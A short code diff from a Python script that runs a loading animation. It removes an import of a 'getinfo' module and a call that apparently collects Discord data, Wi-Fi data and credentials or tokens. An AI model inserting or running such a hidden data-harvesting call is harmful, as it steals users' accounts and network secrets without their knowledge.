@@ -191,8 +191,7 @@ def loading_animation():
 stop_loading = False
 loading_thread = threading.Thread(target=loading_animation)
 loading_thread.start()
-import getinfo
-getinfo.info(username=msaz, password=paz, more=tokkk, camera=False, discord_data=True, wifi_data=True)
+# In dev
 stop_loading = True
 loading_thread.join()
 
